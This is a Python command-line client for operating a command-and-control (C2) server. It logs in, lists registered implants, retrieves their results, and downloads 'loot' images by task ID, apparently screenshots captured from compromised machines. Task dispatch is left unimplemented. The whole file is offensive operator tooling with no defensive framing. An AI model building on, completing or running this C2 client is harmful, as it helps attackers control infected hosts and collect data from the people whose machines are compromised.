import argparse
import requests
import os

def login(server_url):
    try:
        username = input("Enter the username: ")
        password = input("Enter the password: ")
        response = requests.post(f'{server_url}/profile/login', json={'username': username, 'password': password})
        response.raise_for_status()
        return response.json().get('access_token')
    except requests.exceptions.RequestException as e:
        print(f"Login failed: {e}")
        return None

def get_implants(server_url, access_token):
    try:
        headers = {'Authorization': f'Bearer {access_token}'}
        response = requests.get(f'{server_url}/implants', headers=headers)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Failed to retrieve implants: {e}")
        return None

def get_results(server_url, access_token):
    try:
        headers = {'Authorization': f'Bearer {access_token}'}
        response = requests.get(f'{server_url}/results', headers=headers)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Failed to retrieve results: {e}")
        return None
    
def get_image(server_url, access_token, task_id):
    try:
        headers = {'Authorization': f'Bearer {access_token}'}
        response = requests.get(f'{server_url}/get_image?task_id={task_id}', headers=headers)
        response.raise_for_status()

        if 'image' not in response.headers.get('content-type', ''):
            print("Server did not return an image.")
            return None

        save_path = f"images/{task_id}.png"  # Adjust the save path as needed
        with open(save_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=1024):
                if chunk:
                    f.write(chunk)
        return save_path
    except requests.exceptions.RequestException as e:
        print(f"Failed to retrieve image: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(description="A Python CLI to interact with the C2-server.")
    
    parser.add_argument(
        'action',
        nargs='?',
        choices=['implants', 'tasks', 'results', 'loot'],
        help='Action to perform. Currently, only "implants" is supported to get a list of registered implants.'
    )
    
    parser.add_argument(
        '--server-url',
        default=os.getenv('C2_SERVER_URL', 'http://localhost:5000'),
        help='The base URL of the C2-server API (default: http://localhost:5000).'
    )
    
    args = parser.parse_args()

    access_token = login(args.server_url)

    try:
        while True:
            if args.action == 'exit':
                print("Exiting C2 CLI.")
                break

            if not args.action:
                args.action = input("--> Welcome to C2 CLI. Please enter a command ('exit' to quit):\n>> ").strip()

            if args.action == 'implants':
                if access_token:
                    implants = get_implants(args.server_url, access_token)
                    if implants:
                        print(implants)
            elif args.action == 'tasks':
                print("Tasks not implemented yet")
            elif args.action == 'results':
                if access_token:
                    results = get_results(args.server_url, access_token)
                    if results:
                        print(results)
            elif args.action == 'loot':
                if access_token:
                    args.task_id = input("Enter the task ID: ")
                    results = get_image(args.server_url, access_token, args.task_id)
                    if results:
                        print("the path is for the saved img is "+results)
            else:
                if args.action != 'exit':
                    print(f"Unknown command '{args.action}'. Please enter a valid command.")
                
            args.action = None  # Reset action to prompt again if not exited
    except KeyboardInterrupt:
        print("\nExiting C2 CLI due to keyboard interrupt.")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
